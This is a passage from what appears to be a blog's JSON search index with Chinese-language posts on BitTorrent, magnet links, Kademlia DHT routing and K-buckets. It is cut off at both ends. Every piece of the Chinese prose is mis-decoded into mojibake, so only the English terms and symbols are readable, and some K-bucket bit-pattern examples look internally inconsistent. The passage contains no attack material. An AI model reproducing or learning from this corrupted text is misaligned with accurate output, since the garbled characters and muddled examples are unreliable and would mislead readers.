color=\"red\">å¯è§è¦åœ¨BTç½‘ç»œä¸­å®Œæˆå®é™…çš„èµ„æºä¸‹è½½ï¼Œå°±å¿…é¡»å®Œæ•´è·å–åˆ°ç§å­æ–‡ä»¶ï¼Œå› ä¸ºç§å­æ–‡ä»¶ä¸­ä¸å•æœ‰infohashå€¼ï¼Œè¿˜æœ‰piece sha1æ ¡éªŒç ï¼Œåˆ†å—ä¸‹è½½æ—¶éœ€è¦è¿›è¡Œæ ¡éªŒï¼Œè€Œç£åŠ›è¿æ¥magnetåªæ˜¯ä¸€ä¸ªæœ€å°åŒ–å…¥å£ï¼Œæœ€ç»ˆè¿˜æ˜¯éœ€è¦é€šè¿‡ç£åŠ›è¿æ¥åœ¨DHTç½‘ç»œä¸­è·å–ç§å­æ–‡ä»¶çš„å®Œæ•´ä¿¡æ¯</font>\n\n\n\n### 0x5: æ ¡éªŒinfo_hash\n\næˆ‘ä»¬å°†ä»DHTç½‘ç»œä¸­ä¸‹è½½çš„ç§å­æ–‡ä»¶å’ŒåŸå§‹çš„ç§å­æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œå¯ä»¥çœ‹åˆ°annouceå’Œannouce-listå­—æ®µéƒ½ä¸¢æ‰äº†(å¼•å…¥äº†DHTç½‘ç»œåï¼ŒBTå¯ä»¥å®ç°Trackerless)ï¼Œcreate dateå‘ç”Ÿäº†å˜åŒ–ï¼Œinfoå­—æ®µä¸å˜\n\nç£åŠ›é“¾æ˜¯ä¸ºäº†ç®€åŒ–BTç§å­æ–‡ä»¶çš„åˆ†å‘ï¼Œå°è£…äº†ä¸€ä¸ªç®€åŒ–ç‰ˆçš„magnet urlï¼Œå®¢æˆ·ç«¯è§£æè¿™ä¸ªmagnetç£åŠ›é“¾ä¹‹åï¼Œéœ€è¦åœ¨DHTç½‘ç»œä¸­å¯»æ‰¾infohashå¯¹åº”çš„peerèŠ‚ç‚¹ï¼Œè·å–èŠ‚ç‚¹æˆåŠŸåï¼Œå‘ç›®æ ‡peerèŠ‚ç‚¹è·å–çœŸæ­£çš„BitTorrentç§å­(.torrentæ–‡ä»¶)ä¿¡æ¯(åŒ…å«äº†å®Œæ•´çš„pieces SHA1æ‚å‡‘ä¿¡æ¯)ï¼Œå¦ä¸€ä¸ªæ¸ é“å°±æ˜¯ä¼ ç»Ÿçš„Btç§å­è®ºå›ä¼šåˆ†å‘.BTç§å­æ–‡ä»¶\n\n\n\n# 8. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/LittleHann/p/6180296.html","tags":["dht"],"categories":["bittorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrentåè®®(ä¸€)","url":"%2Fp%2F22f54442.html","content":"\n# 1.å¼•è¨€\n\nå¹³å¸¸æˆ‘ä»¬é«˜ç«¯ç”¨æˆ·éƒ½ä¼šç”¨åˆ°BTå·¥å…·æ¥åˆ†äº«ä¸€äº›å¥½ç©çš„èµ„æºï¼Œä¾‹å¦‚ubuntu 13.04çš„ISOå®‰è£…ç›˜ï¼Œä¸€äº›å¥½å¬çš„éŸ³ä¹ç­‰ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šè¿›å…¥ä¸€ä¸ªå«åšP2Pçš„ç½‘ç»œï¼Œå¤§å®¶éƒ½åœ¨è¿™ä¸ªç½‘ç»œé‡Œäº’ç›¸ä¼ é€’æ•°æ®ï¼Œè¿™ç§åˆ†å¸ƒå¼çš„æ•°æ®ä¼ è¾“è§£å†³äº†HTTPã€FTPç­‰å•ä¸€æœåŠ¡å™¨çš„å¸¦å®½å‹åŠ›ã€‚ä»¥å¾€çš„BTå·¥å…·ï¼ˆåŒ…æ‹¬ç°åœ¨ä¹Ÿæœ‰ï¼‰åœ¨åŠ å…¥è¿™ä¸ªP2Pç½‘ç»œçš„æ—¶å€™éƒ½éœ€è¦å€ŸåŠ©ä¸€ä¸ªå«Trackerçš„ä¸­å¿ƒæœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨æ˜¯ç”¨æ¥ç™»è®°æœ‰å“ªäº›ç”¨æˆ·åœ¨è¯·æ±‚å“ªäº›èµ„æºï¼Œç„¶åè®©è¯·æ±‚åŒä¸€ä¸ªèµ„æºçš„ç”¨æˆ·éƒ½é›†ä¸­åœ¨ä¸€èµ·äº’ç›¸åˆ†äº«æ•°æ®ï¼Œå½¢æˆçš„ä¸€ä¸ªé›†ç¾¤å«åšSwarmã€‚\n\n<!-- more -->\n\nè¿™ç§å·¥ä½œæ–¹å¼æœ‰ä¸€ä¸ªå¼Šç«¯å°±æ˜¯ä¸€æ—¦TrackeræœåŠ¡å™¨å‡ºç°æ•…éšœæˆ–è€…çº¿è·¯é­åˆ°å±è”½ï¼ŒBTå·¥å…·å°±æ— æ³•æ­£å¸¸å·¥ä½œäº†ã€‚æ‰€ä»¥èªæ˜çš„äººç±»åæ¥å‘æ˜äº†ä¸€ç§å«åšDHTï¼ˆDistributed Hash Tableï¼‰çš„å»ä¸­å¿ƒåŒ–ç½‘ç»œã€‚æ¯ä¸ªåŠ å…¥è¿™ä¸ªDHTç½‘ç»œçš„äººéƒ½è¦è´Ÿè´£å­˜å‚¨è¿™ä¸ªç½‘ç»œé‡Œçš„èµ„æºä¿¡æ¯å’Œå…¶ä»–æˆå‘˜çš„è”ç³»ä¿¡æ¯ï¼Œç›¸å½“äºæ‰€æœ‰äººä¸€èµ·æ„æˆäº†ä¸€ä¸ªåºå¤§çš„åˆ†å¸ƒå¼å­˜å‚¨æ•°æ®åº“ã€‚åœ¨DHTé‡Œå®šä½ä¸€ä¸ªç”¨æˆ·å’Œå®šä½ä¸€ä¸ªèµ„æºçš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œä»–ä»¬éƒ½ä½¿ç”¨SHAï¼1äº§ç”Ÿçš„å“ˆå¸Œå€¼æ¥ä½œæ ‡è¯†ã€‚\n\n\n### 0x1: Kademlia/DHT/KRPC/BitTorrentä¹‹é—´çš„å…³ç³»\n\nKademliaæ˜¯ä¸€ä¸ªæœ€åˆæå‡ºçš„æ¡†æ¶å’Œç†è®ºåŸºç¡€ï¼ŒP2På¯¹ç­‰èµ„æºå…±äº«çš„æ€æƒ³ä»è¿™é‡Œå¼€å§‹è¡ç”Ÿï¼ŒDHTå’ŒKRPCæ˜¯åœ¨Kademliaçš„åŸºç¡€ä¸Šè¿›è¡Œäº†åŒ…è£…å’Œå‘å±•ï¼ŒBitTorrentæ˜¯åœ¨è¿™ä¸‰è€…ä¹‹ä¸Šçš„æ–‡ä»¶å…±äº«åˆ†å‘åè®®ã€‚\n\n### 0x2: Magnet URIæ ¼å¼\n\n```\nmagnet:?xt=urn:btih:<info-hash>&dn=<name>&tr=<tracker-url>\n\n1. <info-hash>: Infohashçš„16è¿›åˆ¶ç¼–ç ï¼Œå…±40å­—ç¬¦ã€‚ä¸ºäº†ä¸å…¶å®ƒçš„ç¼–ç å…¼å®¹ï¼Œå®¢æˆ·ç«¯åº”å½“ä¹Ÿæ”¯æŒ32å­—ç¬¦çš„infohash base32ç¼–ç  \n2. Xtæ˜¯å”¯ä¸€å¼ºåˆ¶çš„å‚æ•°\n3. dnæ˜¯åœ¨ç­‰å¾…metadataæ—¶å¯èƒ½ä¾›å®¢æˆ·ç«¯æ˜¾ç¤ºçš„åå­—\n4. å¦‚æœåªæœ‰ä¸€ä¸ªå­—æ®µï¼ŒTræ˜¯trackerçš„urlï¼Œå¦‚æœæœ‰å¾ˆå¤šçš„trackerï¼Œé‚£ä¹ˆå¤šä¸ªtrå­—æ®µä¼šè¢«åŒ…å«è¿›å» \n# dnå’Œtréƒ½æ˜¯å¯é€‰çš„ \n```\nå¦‚æœæ²¡æœ‰æŒ‡å®štrackerï¼Œå®¢æˆ·ç«¯åº”ä½¿ç”¨DHTæ¥è·å–peers\n\n\n### 0x3:P2Pçš„å«ä¹‰\n\nä»ç¬¬ä¸€ä¸ªP2Påº”ç”¨ç³»ç»ŸNapsterçš„å‡ºç°å¼€å§‹ï¼ŒP2PæŠ€æœ¯æ€èµ·çš„é£æš´ä¸ºäº’è”ç½‘å¸¦æ¥äº†ä¸€åœºç©ºå‰çš„å˜é©ã€‚P2Pä¸æ˜¯ä¸€ä¸ªå…¨æ–°çš„æ¦‚å¿µï¼ŒP2Pç†å¿µçš„èµ·æºå¯ä»¥è¿½æº¯åˆ°20ä¸–çºª80å¹´ä»£ã€‚ç›®å‰ï¼Œåœ¨å­¦æœ¯ç•Œã€å·¥ä¸šç•Œå¯¹äºP2Pæ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„å®šä¹‰ã€‚Peeråœ¨è‹±è¯­é‡Œæœ‰â€œ(åœ°ä½ã€èƒ½åŠ›ç­‰)åŒç­‰è€…â€ã€â€œåŒäº‹â€å’Œâ€œä¼™ä¼´â€ç­‰æ„ä¹‰ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒP2Pä¹Ÿå°±å¯ä»¥ç†è§£ä¸ºâ€œä¼™ä¼´å¯¹ä¼™ä¼´â€çš„æ„æ€ï¼Œæˆ–ç§°ä¸ºå¯¹ç­‰ç½‘ \n\nä¸¥æ ¼åœ°å®šä¹‰çº¯ç²¹çš„P2Pç½‘ç»œï¼Œå®ƒæ˜¯æŒ‡å®Œå…¨åˆ†å¸ƒçš„ç³»ç»Ÿï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯åœ¨åŠŸèƒ½ä¸Šå’Œä»»åŠ¡ä¸Šå®Œå…¨ç›¸åŒçš„ã€‚ä½†æ˜¯è¿™æ ·çš„å®šä¹‰å°±ä¼šæ’é™¤æ‰ä¸€äº›ä½¿ç”¨â€œè¶…çº§èŠ‚ç‚¹â€çš„ç³»ç»Ÿæˆ–è€…ä¸€äº›ä½¿ç”¨ä¸­å¤®æœåŠ¡å™¨åšä¸€äº›éæ ¸å¿ƒä»»åŠ¡çš„ç³»ç»Ÿã€‚å¹¿ä¹‰çš„å®šä¹‰é‡Œé¢æŒ‡å‡ºP2Pæ˜¯ä¸€ç§èƒ½å–„äºåˆ©ç”¨äº’è”ç½‘ä¸Šçš„å­˜å‚¨ã€CPUå‘¨æœŸã€å†…å®¹å’Œç”¨æˆ·æ´»åŠ¨ç­‰å„ç§èµ„æºçš„ä¸€ç±»åº”ç”¨ç¨‹åº[3]ï¼ŒåŒ…æ‹¬äº†ä¸€äº›ä¾èµ–ä¸­å¤®æœåŠ¡å™¨æ‰èƒ½å·¥ä½œçš„ç³»ç»Ÿ \n\nP2Pè¿™ä¸ªå®šä¹‰å¹¶ä¸æ˜¯ä»ç³»ç»Ÿçš„ç»“æ„æˆ–è€…å†…éƒ¨çš„æ“ä½œç‰¹å¾å‡ºå‘è€ƒè™‘çš„ï¼Œè€Œæ˜¯ä»äººä»¬å¤–åœ¨çš„æ„ŸçŸ¥è§’åº¦å‡ºå‘ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿä»ç›´è§‚ä¸Šçœ‹æ˜¯å„ä¸ªè®¡ç®—æœºä¹‹é—´ç›´æ¥äº’ç›¸è”ç³»çš„å°±å¯ä»¥è¢«å«åšP2Pã€‚å½“å‰ï¼ŒæŠ€æœ¯ä¸Šæ¯”è¾ƒæƒå¨çš„å®šä¹‰ä¸ºï¼ŒP2Pç³»ç»Ÿæ˜¯ä¸€ä¸ªç”±ç›´æ¥ç›¸è¿çš„èŠ‚ç‚¹ä»¬æ‰€æ„æˆçš„åˆ†å¸ƒå¼çš„ç³»ç»Ÿ[4]ï¼Œè¿™äº›èŠ‚ç‚¹èƒ½å¤Ÿä¸ºäº†å…±äº«å†…å®¹ã€CPU æ—¶é—´ã€å­˜å‚¨æˆ–è€…å¸¦å®½ç­‰èµ„æºè€Œè‡ªæˆ‘å½¢æˆä¸€å®šçš„ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼Œèƒ½å¤Ÿåœ¨é€‚åº”èŠ‚ç‚¹æ•°ç›®çš„å˜åŒ–å’Œå¤±æ•ˆçš„åŒæ—¶ç»´æŒå¯ä»¥æ¥å—çš„é“¾æ¥èƒ½åŠ›å’Œæ€§èƒ½ï¼Œå¹¶ä¸”ä¸éœ€è¦ä¸€ä¸ªå…¨å±€æœåŠ¡å™¨æˆ–è€…æƒå¨çš„ä¸­ä»‹çš„æ”¯æŒã€‚æœ¬æ–‡ä»äººä»¬æ„ŸçŸ¥çš„è§’åº¦å‡ºå‘ï¼Œé‡‡ç”¨P2Pçš„å¹¿ä¹‰å®šä¹‰\n\n\n# 2. Kademliaåè®®\n\n### 0x1: Kademlia\n\nKademliaæ˜¯ä¸€ç§é€šè¿‡åˆ†æ•£å¼æ‚å‡‘è¡¨å®ç°çš„åè®®ç®—æ³•ï¼Œå®ƒæ˜¯ç”±Petarå’ŒDavidä¸ºéé›†ä¸­å¼P2Pè®¡ç®—æœºç½‘ç»œè€Œè®¾è®¡çš„\n\n```\n1. Kademliaè§„å®šäº†ç½‘ç»œçš„ç»“æ„ï¼Œä¹Ÿè§„å®šäº†é€šè¿‡èŠ‚ç‚¹æŸ¥è¯¢è¿›è¡Œä¿¡æ¯äº¤æ¢çš„æ–¹å¼\n2. Kademliaç½‘ç»œèŠ‚ç‚¹ä¹‹é—´ä½¿ç”¨UDPè¿›è¡Œé€šè®¯\n3. å‚ä¸é€šè®¯çš„æ‰€æœ‰èŠ‚ç‚¹å½¢æˆä¸€å¼ è™šæ‹Ÿç½‘(æˆ–è€…å«åšè¦†ç›–ç½‘)ã€‚è¿™äº›èŠ‚ç‚¹é€šè¿‡ä¸€ç»„æ•°å­—(æˆ–ç§°ä¸ºèŠ‚ç‚¹ID)æ¥è¿›è¡Œèº«ä»½æ ‡è¯†\n4. èŠ‚ç‚¹IDä¸ä»…å¯ä»¥ç”¨æ¥åšèº«ä»½æ ‡è¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œå€¼å®šä½(å€¼é€šå¸¸æ˜¯æ–‡ä»¶çš„æ•£åˆ—æˆ–è€…å…³é”®è¯)\n5. <font color=red>å…¶å®ï¼ŒèŠ‚ç‚¹IDä¸æ–‡ä»¶æ•£åˆ—ç›´æ¥å¯¹åº”ï¼Œå®ƒæ‰€è¡¨ç¤ºçš„é‚£ä¸ªèŠ‚ç‚¹å­˜å‚¨ç€å“ªå„¿èƒ½å¤Ÿè·å–æ–‡ä»¶å’Œèµ„æºçš„ç›¸å…³ä¿¡æ¯</font>\n6. å½“æˆ‘ä»¬åœ¨ç½‘ç»œä¸­æœç´¢æŸäº›å€¼(å³é€šå¸¸æœç´¢å­˜å‚¨æ–‡ä»¶æ•£åˆ—æˆ–å…³é”®è¯çš„èŠ‚ç‚¹)çš„æ—¶å€™ï¼ŒKademliaç®—æ³•éœ€è¦çŸ¥é“ä¸è¿™äº›å€¼ç›¸å…³çš„é”®ï¼Œç„¶ååˆ†æ­¥åœ¨ç½‘ç»œä¸­å¼€å§‹æœç´¢ã€‚æ¯ä¸€æ­¥éƒ½ä¼šæ‰¾åˆ°ä¸€äº›èŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹çš„IDä¸é”®æ›´ä¸ºæ¥è¿‘ï¼Œå¦‚æœæœ‰èŠ‚ç‚¹ç›´æ¥è¿”å›æœç´¢çš„å€¼æˆ–è€…å†ä¹Ÿæ— æ³•æ‰¾åˆ°ä¸é”®æ›´ä¸ºæ¥è¿‘çš„èŠ‚ç‚¹IDçš„æ—¶å€™æœç´¢ä¾¿ä¼šåœæ­¢ã€‚è¿™ç§æœç´¢å€¼çš„æ–¹æ³•æ˜¯éå¸¸é«˜æ•ˆçš„\n7. ä¸å…¶ä»–çš„åˆ†æ•£å¼æ‚å‡‘è¡¨çš„å®ç°ç±»ä¼¼ï¼Œåœ¨ä¸€ä¸ªåŒ…å«nä¸ªèŠ‚ç‚¹çš„ç³»ç»Ÿçš„å€¼çš„æœç´¢ä¸­ï¼ŒKademliaä»…è®¿é—®O(log(n))ä¸ªèŠ‚ç‚¹ã€‚éé›†ä¸­å¼ç½‘ç»œç»“æ„è¿˜æœ‰æ›´å¤§çš„ä¼˜åŠ¿ï¼Œé‚£å°±æ˜¯å®ƒèƒ½å¤Ÿæ˜¾è‘—å¢å¼ºæŠµå¾¡æ‹’ç»æœåŠ¡æ”»å‡»çš„èƒ½åŠ›ã€‚å³ä½¿ç½‘ç»œä¸­çš„ä¸€æ•´æ‰¹èŠ‚ç‚¹é­å—æ³›æ´ªæ”»å‡»ï¼Œä¹Ÿä¸ä¼šå¯¹ç½‘ç»œçš„å¯ç”¨æ€§é€ æˆå¾ˆå¤§çš„å½±å“ï¼Œé€šè¿‡ç»•è¿‡è¿™äº›æ¼æ´(è¢«æ”»å‡»çš„èŠ‚ç‚¹)æ¥é‡æ–°ç¼–ç»‡ä¸€å¼ ç½‘ç»œï¼Œç½‘ç»œçš„å¯ç”¨æ€§å°±å¯ä»¥å¾—åˆ°æ¢å¤ \n```\n\n### 0x2: p2pç½‘ç»œæ¶æ„æ¼”è¿›\n\n```\n1. ç¬¬ä¸€ä»£P2Pæ–‡ä»¶åˆ†äº«ç½‘ç»œï¼ŒåƒNapsterï¼Œä¾èµ–äºä¸­å¤®æ•°æ®åº“æ¥åè°ƒç½‘ç»œä¸­çš„æŸ¥è¯¢\n2. ç¬¬äºŒä»£P2Pç½‘ç»œï¼ŒåƒGnutellaï¼Œä½¿ç”¨æ³›æ»¥å¼æŸ¥è¯¢(query flooding)æ¥æŸ¥è¯¢æ–‡ä»¶ï¼Œå®ƒä¼šæœç´¢ç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹\n3. ç¬¬ä¸‰ä»£p2pç½‘ç»œä½¿ç”¨åˆ†æ•£å¼æ‚å‡‘è¡¨æ¥æŸ¥è¯¢ç½‘ç»œä¸­çš„æ–‡ä»¶ï¼Œåˆ†æ•£å¼æ‚å‡‘è¡¨åœ¨æ•´ä¸ªç½‘ç»œä¸­å‚¨å­˜èµ„æºçš„ä½ç½®\n```\n\nè¿™äº›åè®®è¿½æ±‚çš„ä¸»è¦ç›®æ ‡å°±æ˜¯å¿«é€Ÿå®šä½æœŸæœ›çš„èŠ‚ç‚¹ã€‚KademliaåŸºäºä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„è·ç¦»è®¡ç®—ï¼Œè¯¥è·ç¦»æ˜¯\"ä¸¤ä¸ªç½‘ç»œèŠ‚ç‚¹IDå·çš„å¼‚æˆ–\"ï¼Œè®¡ç®—çš„ç»“æœæœ€ç»ˆä½œä¸ºæ•´å‹æ•°å€¼è¿”å›ã€‚å…³é”®å­—å’ŒèŠ‚ç‚¹IDæœ‰åŒæ ·çš„æ ¼å¼å’Œé•¿åº¦ï¼Œå› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è®¡ç®—å…³é”®å­—å’ŒèŠ‚ç‚¹IDä¹‹é—´çš„è·ç¦»ã€‚èŠ‚ç‚¹IDä¸€èˆ¬æ˜¯ä¸€ä¸ªå¤§çš„éšæœºæ•°ï¼Œé€‰æ‹©è¯¥æ•°çš„æ—¶å€™æ‰€è¿½æ±‚çš„ä¸€ä¸ªç›®æ ‡å°±æ˜¯å®ƒçš„å”¯ä¸€æ€§(å¸Œæœ›åœ¨æ•´ä¸ªç½‘ç»œä¸­è¯¥èŠ‚ç‚¹IDæ˜¯å”¯ä¸€çš„)ã€‚å¼‚æˆ–è·ç¦»è·Ÿå®é™…ä¸Šçš„åœ°ç†ä½ç½®æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåªä¸IDç›¸å…³ã€‚å› æ­¤å¾ˆå¯èƒ½æ¥è‡ªå¾·å›½å’Œæ¾³å¤§åˆ©äºšçš„èŠ‚ç‚¹ç”±äºé€‰æ‹©äº†ç›¸ä¼¼çš„éšæœºIDè€Œæˆä¸ºé‚»å±…ã€‚é€‰æ‹©å¼‚æˆ–æ˜¯å› ä¸ºé€šè¿‡å®ƒè®¡ç®—çš„è·ç¦»äº«æœ‰å‡ ä½•è·ç¦»å…¬å¼çš„ä¸€äº›ç‰¹å¾ï¼Œå°¤å…¶ä½“ç°åœ¨ä»¥ä¸‹å‡ ç‚¹\n\n```\n1. èŠ‚ç‚¹å’Œå®ƒæœ¬èº«ä¹‹é—´çš„å¼‚æˆ–è·ç¦»æ˜¯0\n2. å¼‚æˆ–è·ç¦»æ˜¯å¯¹ç§°çš„ï¼šå³ä»Aåˆ°Bçš„å¼‚æˆ–è·ç¦»ä¸ä»Båˆ°Açš„å¼‚æˆ–è·ç¦»æ˜¯ç­‰åŒçš„\n3. å¼‚æˆ–è·ç¦»ç¬¦åˆä¸‰è§’ä¸ç­‰å¼: ä¸‰ä¸ªé¡¶ç‚¹A B Cï¼ŒACå¼‚æˆ–è·ç¦»å°äºæˆ–ç­‰äºABå¼‚æˆ–è·ç¦»å’ŒBCå¼‚æˆ–è·ç¦»ä¹‹å’Œï¼Œè¿™ç§å‡ ä½•æ•°å­¦ç‰¹å¾ï¼Œå¯ä»¥å¾ˆå¥½çš„æ”¯æ’‘ç®—æ³•è¿›è¡Œå¯»è·¯è·¯ç”±\n```\n\nç”±äºä»¥ä¸Šçš„è¿™äº›å±æ€§ï¼Œåœ¨å®é™…çš„èŠ‚ç‚¹è·ç¦»çš„åº¦é‡è¿‡ç¨‹ä¸­è®¡ç®—é‡å°†å¤§å¤§é™ä½ã€‚Kademliaæœç´¢çš„æ¯ä¸€æ¬¡è¿­ä»£å°†è·ç›®æ ‡è‡³å°‘æ›´è¿‘1 bit(æ¯æ¬¡æ ¹æ®XORç»“æœï¼Œå¾€å‰é€‰æ‹©1bitæ›´è¿‘çš„èŠ‚ç‚¹)ã€‚ä¸€ä¸ªåŸºæœ¬çš„å…·æœ‰2çš„næ¬¡æ–¹ä¸ªèŠ‚ç‚¹çš„Kademliaç½‘ç»œåœ¨æœ€åçš„æƒ…å†µä¸‹åªéœ€èŠ±næ­¥å°±å¯æ‰¾åˆ°è¢«æœç´¢çš„èŠ‚ç‚¹æˆ–å€¼\n\n\n>å› ä¸ºKademliaæ˜¯æ ¹æ®bitä½XORè®¡ç®—å¾—åˆ°\"ç›¸å¯¹è·ç¦»\"çš„ï¼Œå¯¹äºè¶Šä½bitä½ï¼ŒXORå¯èƒ½å¾—åˆ°çš„ç»“æœè¶Šå°ï¼Œå¯¹äºè¶Šé«˜ä½çš„bitä½ï¼ŒXORå¯èƒ½å¾—åˆ°çš„å€¼å°±è¶Šå¤§ï¼Œå¹¶ä¸”æ˜¯å‘ˆç°2çš„æŒ‡æ•°æ–¹å¼å¢é•¿çš„ï¼Œæ‰€ä»¥ï¼Œä»æ•°å­¦ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªDHTç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œé€šè¿‡è¿™ç§æ–¹å¼(XORè·ç¦»)è¿›è¡Œå¯»å€ï¼Œæ¯æ¬¡å‰è¿›ä¸€ä¸ªbitï¼Œæœ€å¤§åªéœ€è¦log2Næ¬¡å³å¯åˆ°è¾¾ç›®æ ‡èŠ‚ç‚¹(log2é€¼è¿‘çš„æ€è·¯ï¼Œå³bit 2å¯ä»¥è¡¨ç¤ºä¸–ç•Œä¸Šä»»ä½•æ•°å­—)\n\n### 0x3: è·¯ç”±è¡¨(å°±æ˜¯Kæ¡¶,å­˜æ”¾ç«¯å£)\n\nKademliaè·¯ç”±è¡¨ç”±å¤šä¸ªåˆ—è¡¨ç»„æˆï¼Œ<font color=red>æ¯ä¸ªåˆ—è¡¨å¯¹åº”èŠ‚ç‚¹IDçš„ä¸€ä½(ä¾‹å¦‚: å‡å¦‚èŠ‚ç‚¹IDå…±æœ‰6ä½ï¼Œåˆ™èŠ‚ç‚¹çš„è·¯ç”±è¡¨å°†åŒ…å«6ä¸ªåˆ—è¡¨)ï¼Œ</font><font color=green>ä¸€ä¸ªåˆ—è¡¨ä¸­åŒ…å«å¤šä¸ªæ¡ç›®ï¼Œæ¡ç›®ä¸­åŒ…å«å®šä½å…¶ä»–èŠ‚ç‚¹æ‰€å¿…è¦çš„ä¸€äº›æ•°æ®ã€‚åˆ—è¡¨æ¡ç›®ä¸­çš„è¿™äº›æ•°æ®é€šå¸¸æ˜¯ç”±å…¶ä»–èŠ‚ç‚¹çš„IPåœ°å€ï¼Œç«¯å£å’ŒèŠ‚ç‚¹IDç»„æˆã€‚</font>è¿™é‡Œä»”ç»†æ€è€ƒä¸€ä¸‹\n\n\n1. èŠ‚ç‚¹IDçš„ä¸€ä½å°±æ˜¯1bitï¼Œå‡è®¾æˆ‘ä»¬çš„èŠ‚ç‚¹IDæ˜¯: 111000\n2. å¯¹ç¬¬ä¸€ä¸ªKæ¡¶æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®å¿…é¡»ç¬¬ä¸€bitä¸èƒ½æ˜¯1ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªKæ¡¶çš„å«ä¹‰æ˜¯å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»æ˜¯æœ€è¿œçš„ä¸€ä¸ªåˆ†ç»„ï¼Œç¬¬ä¸€ä½ä¸ä¸º1ï¼Œå®ƒèƒŒåçš„å«ä¹‰æ˜¯è¯¥åˆ†ç»„é‡Œçš„èŠ‚ç‚¹å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»è‡³å°‘åœ¨2^6ä»¥ä¸Šï¼Œå®ƒä»£è¡¨äº†æ•´ä¸ªç½‘ç»œä¸­å’Œè¯¥èŠ‚ç‚¹é€»è¾‘è·ç¦»æœ€è¿œçš„ä¸€äº›èŠ‚ç‚¹ å®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 0 00000 ~ 0 111111\n3. å¯¹ç¬¬äºŒä¸ªKæ¡¶æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®çš„ç¬¬ä¸€ä½å¿…é¡»æ˜¯1ï¼Œè¡¨ç¤ºå’Œå½“å‰èŠ‚ç‚¹çš„ç¬¬ä¸€bitç›¸åŒï¼Œç¬¬äºŒbitä¸èƒ½æ˜¯1ï¼Œè¿™æ ·ä»£è¡¨çš„æ„æ€æ˜¯ç¬¬äºŒä¸ªKæ¡¶é‡Œçš„èŠ‚ç‚¹å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»æ˜¯ä»‹äºMAX(2bit)å’ŒMIN(1bit)ä¹‹é—´çš„è·ç¦»ï¼Œå®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 10 0000 ~ 10 1111\n4. ç¬¬ä¸‰ä¸ªKæ¡¶çš„æƒ…å†µå’Œå‰2ä¸ªç›¸åŒ  \n5. å¯¹ç¬¬å››ä¸ªKæ¡¶çš„æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®å‰ä¸‰ä½éƒ½æ˜¯1ï¼Œç¬¬å››ä½ä¸æ˜¯0ï¼Œå®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 1111 00 ~ 1111 11\n6. åé¢çš„bitä½æƒ…å†µç±»æ¨ï¼Œå¯ä»¥çœ‹å‡ºï¼Œ<font color=red>è¶Šä½bitä½çš„Kæ¡¶çš„MAX(XOR)å°±è¶Šå°ï¼Œå®ƒçš„å¯å˜èŒƒå›´å°±è¶Šå°äº†ã€‚è¿™ä»£è¡¨äº†è¶Šä½bitä½çš„Kæ¡¶é‡Œå­˜å‚¨çš„éƒ½æ˜¯è·ç¦»å½“å‰èŠ‚ç‚¹è¶Šè¿‘çš„NodèŠ‚ç‚¹</font>\n\n\nè€Œæ¡ç›®åˆ—è¡¨ä»¥èŠ‚ç‚¹IDçš„ä¸€ä½(å³1bit)æ¥åˆ†ç»„æ˜¯æœ‰é“ç†çš„ï¼šæˆ‘ä»¬ä½¿ç”¨log2Nçš„æŒ‡æ•°åˆ†çº§æ–¹æ³•æŠŠé™¤å½“å‰èŠ‚ç‚¹çš„å…¨ç½‘æ‰€æœ‰èŠ‚ç‚¹éƒ½è¿›è¡Œäº†åˆ†ç»„ï¼Œå½“åˆ«çš„èŠ‚ç‚¹æ¥å‘å½“å‰èŠ‚ç‚¹è¯·æ±‚æŸä¸ªèµ„æºHASHçš„æ—¶å€™ï¼Œå°†å¾…æœç´¢å¯»å€çš„\"ç›®æ ‡èŠ‚ç‚¹ID\"å’Œè·¯ç”±è¡¨è¿›è¡Œå¼‚æˆ–ï¼Œä¼šæœ‰2ç§æƒ…å†µ\n\n1. æ‰¾åˆ°æŸä¸ªæ¡ç›®å’Œç›®æ ‡èŠ‚ç‚¹XORä¸º0ï¼Œå³å·²ç»å¯»å€æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›è¿™ä¸ªæ¡ç›®ç»™requesterå³å¯\n2. <font color=red>å¦‚æœæ²¡æ‰¾åˆ°XORç»“æœä¸º0çš„æ¡ç›®ï¼Œåˆ™é€‰å–é‚£ä¸ªXORå€¼æœ€å°çš„æ¡ç›®å¯¹åº”çš„Kæ¡¶ä¸­çš„Kä¸ªæ¡ç›®è¿”å›ç»™requesterï¼Œå› ä¸ºè¿™äº›æ¡ç›®æ˜¯æœ€æœ‰å¯èƒ½å­˜å‚¨äº†ç›®æ 